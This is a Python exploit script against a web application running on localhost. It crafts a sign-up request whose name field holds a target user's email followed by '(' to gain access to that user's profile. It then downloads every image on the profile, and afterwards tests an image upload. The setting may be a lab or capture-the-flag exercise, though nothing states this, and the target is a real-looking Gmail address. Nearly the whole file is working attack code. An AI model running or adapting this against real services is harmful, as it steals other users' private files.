import requests
import random
import string
from bs4 import BeautifulSoup
import os

os.makedirs('images', exist_ok=True)

ip = "http://localhost:8008/"
target_email = "2nov.petro@gmail.com"

img_path = r'exploit_demo\Screenshot_422.png'


def register(session, email, name):
    data = {'email': email, 'name': name}
    res = session.post(ip+'sign-up', data=data)
    res = s.post(ip+'download_key')
    return res

def login(session, email, private_key):
    data = {'email': email, 'private_key': private_key}
    res = session.post(ip+'login', data=data)
    return res

def upload_image(session, image_path, email):
    with open(image_path, 'rb') as f:
        data = f.read()
    files = {'file': data}
    res = session.post(ip+'profile_'+email, files=files)
    return res


def generate_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


s = requests.Session()

data = {'email': generate_random_string(
    10) + "@google.com", 'name': target_email + "("}


res = s.post(ip+'sign-up', data=data)
res = s.post(ip+'download_key')
private_key = res.content
res = s.get(ip+'profile_'+target_email)


soup = BeautifulSoup(res.text, 'html.parser')
imgs = soup.find_all('img')
imgs = [img['src'] for img in imgs]

for img in imgs:
    res = s.get(ip+img)
    with open(os.path.join('images', img.split('/')[-1]), 'wb') as f:
        f.write(res.content)
        
s = requests.Session()
email = generate_random_string(10) + "@google.com"
res = register(s, email, 'test')
print("registration code: ", res.status_code)
res = upload_image(s, img_path, email)
print("upload code: ", res.status_code)
res = s.get(ip+'profile_'+email)
soup = BeautifulSoup(res.text, 'html.parser')
print(soup)
